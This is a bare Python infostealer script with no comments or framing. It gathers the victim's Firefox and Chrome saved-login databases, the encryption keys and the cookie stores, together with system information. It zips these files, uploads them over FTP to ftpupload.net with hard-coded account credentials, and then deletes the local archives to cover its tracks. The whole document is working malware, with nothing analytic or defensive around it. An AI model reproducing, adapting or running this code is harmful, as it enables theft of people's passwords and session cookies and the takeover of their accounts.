import os
import random
import platform
import time
import zipfile
from ftplib import FTP
from pathlib import Path
t = time.localtime()
timestamp = time.strftime('%b-%d-%Y', t)
fina=os.getenv("TEMP")
hellarea = random.randint(0, 100)
hellar = str(hellarea)
dirs = os.listdir("C:/users/" + os.getlogin() + "/AppData/Roaming/Mozilla/Firefox/Profiles/")
ch_cookies = "C:/users/" + os.getlogin() + '/AppData/Local/Google/Chrome/User Data/Default/Network'
ch_logins = "C:/users/" + os.getlogin() + '/AppData/Local/Google/Chrome/User Data/Default'
ch_enkey= "C:/users/" + os.getlogin() + '/AppData/Local/Google/Chrome/User Data'
key04 =os.getenv('APPDATA')+'/Mozilla/Firefox/Profiles/'+ dirs[0]
cookies = os.getenv('APPDATA')+'/Mozilla/Firefox/Profiles/'+ dirs[0]
logins =os.getenv('APPDATA')+'/Mozilla/Firefox/Profiles/'+ dirs[0]
finalzip = fina + '/' + timestamp+'-'+ hellar + '-Firefox.zip'
finalzip1 = fina + '/' + timestamp+'-'+ hellar + '-Chrome.zip'
def sysinfo():
    uname=platform.uname()
    lines = [f'System: {uname.system}', f'Node Name: {uname.node}', f'Machine: {uname.machine}',f'Version: {uname.version}']
    with open(fina+'\info.txt', 'w') as f:
        f.write('\n'.join(lines))
def fire_key():
    if os.path.exists(key04+"/key4.db"):
        fire_log()
    else:
        fire_log()
def fire_log():
    if os.path.exists(logins+ "/logins.json"):
        fire_cook()
    else:
        fire_cook()
def fire_cook():
    if os.path.exists(cookies+"/cookies.sqlite"):
        upload()
    else:
        upload()
def upload1():
    file_path = Path(finalzip)
    with FTP('ftpupload.net', 'epiz_32849482', 'JEuBoR4PIT3n3P9') as ftp, open(file_path, 'rb') as file:
        ftp.storbinary(f'STOR {file_path.name}', file)
    os.remove(file_path)
    os.remove(fina+'/info.txt')
def upload():
    sysinfo()
    list_files = [logins+'/logins.json', key04+'/key4.db', cookies+'/cookies.sqlite',fina+'/info.txt']
    with zipfile.ZipFile(finalzip, 'w') as zipF:
        for file in list_files:
            zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
    upload1()
def ch_cook():
    if os.path.exists(ch_cookies+'/Cookies'):
        ch_logi()
    else:
        ch_logi()
def ch_sess():
    if os.path.exists(ch_cookies+'/Sessions'):
        upload_ch()
    else:
        upload_ch()
def upload_ch():
    sysinfo()
    list_files = [ch_cookies + '/Cookies', ch_logins + '/Login Data',ch_enkey+'/Local State',fina+'/info.txt']
    with zipfile.ZipFile(finalzip1, 'w') as zipF:
        for file in list_files:
            zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
    file_path = Path(finalzip1)
    with FTP('ftpupload.net', 'epiz_32849482', 'JEuBoR4PIT3n3P9') as ftp, open(file_path, 'rb') as file:
        ftp.storbinary(f'STOR {file_path.name}', file)
    os.remove(file_path)
    os.remove(fina + '/info.txt')
def ch_logi():
    if os.path.exists(ch_logins+'/Login Data'):
        ch_keyen()
    else:
        ch_keyen()
def ch_keyen():
    if os.path.exists(ch_enkey+'/Local State'):
        ch_sess()
    else:
        ch_sess()


ch_cook()
fire_key()